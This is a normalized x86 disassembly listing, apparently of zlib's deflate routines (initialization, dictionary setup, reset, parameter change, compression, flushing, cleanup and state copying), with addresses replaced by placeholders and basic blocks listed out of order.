mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] sub_4086be
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x0
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] sub_4086e7
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
mov [ ebp + 0xc ] 0x6
cmp [ ebp + 0x18 ] 0x1
jl r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp + 0x14 ]
neg ecx
mov [ ebp + 0x14 ] ecx
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x18 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x8
jne r-xdata
cmp [ ebp + 0x14 ] 0x8
jl r-xdata
cmp [ ebp + 0x14 ] 0xf
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x1c ] 0x0
jl r-xdata
cmp [ ebp + 0x1c ] 0x2
jle r-xdata
push 0x16b8
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x28 ] eax
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x28 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp + 0x18 ]
add ecx 0x7
mov edx [ ebp - 0x8 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x48 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x48 ]
add eax 0x2
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x50 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x38 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x3c ] eax
mov ecx [ ebp + 0x18 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1694 ] eax
push 0x4
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_406dc5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x1694 ]
shr edx 0x1
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x169c ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1690 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x7c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
mov [ ecx + 0x80 ] edx
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x10 ]
mov [ eax + 0x1d ] cl
mov edx [ ebp + 0x8 ]
push edx
call sub_406741
add esp 0x4
sub_4065a1
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
push eax
call sub_408700
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] eax
cmp [ ebp - 0x8 ] 0x3
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp [ ebp - 0x8 ] eax
jbe r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
xor eax eax
mov al [ ecx + 0x1 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x3
cmp [ ebp - 0x10 ] edx
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
xor ebx ebx
mov bl [ ecx + eax + 0x2 ]
xor edx ebx
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
and edx [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov ax [ ebp - 0xc ]
mov [ ecx + edx * 2 ] ax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov ax [ ebp - 0x10 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_406741
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
neg ecx
sbb ecx ecx
and ecx 0x47
add ecx 0x2a
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
push edx
call sub_408980
add esp 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_407122
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
sub_406812
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov [ ebp + 0xc ] 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
mov edx [ ecx + r--data ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x7c ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ edx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x7c ] ecx
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x88 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x74 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40692e
add esp 0x8
mov [ ebp - 0x4 ] eax
sub_40692e
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x4
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x20 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2a
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
sub edx 0x8
shl edx 0x4
add edx 0x8
shl edx 0x8
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
sub ecx 0x1
sar ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x3
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_406d00
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0x6
mov eax [ ebp - 0xc ]
or eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
sub eax edx
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x71
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406cb0
add esp 0x8
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
or edx 0x20
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
shr ecx 0x10
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_406cb0
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
and ecx 0xffff
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_406cb0
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
call [ ecx + r--data ]
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ edx + 0x18 ] eax
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x29a
cmp [ ebp - 0x14 ] 0x3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
shr eax 0x10
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406cb0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406cb0
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_406d00
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xffffffff
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ecx + 0x14 ] 0x0
sete al
mov eax 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_408ae4
add esp 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_408c23
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406d00
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ ecx + edx * 2 - 0x2 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ eax + eax - 0x2 ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_406cb0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0xc ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
sub_406d00
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ edx + 0x8 ]
mov [ ecx + 0x10 ] edx
sub_406dc5
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x71
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
cmp [ ebp - 0x4 ] 0x29a
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x24 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0x0
xor eax eax
cmp [ ebp - 0x4 ] 0x71
setne al
dec eax
and al 0xfd
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
sub_406ed6
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov esi [ ebp + 0xc ]
mov ecx 0xe
mov edi [ ebp + 0x8 ]
[ edi ] [ esi ]
push 0x16b8
push 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov ecx 0x5ae
[ edi ] [ esi ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
push 0x2
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x30 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x38 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
push 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
push eax
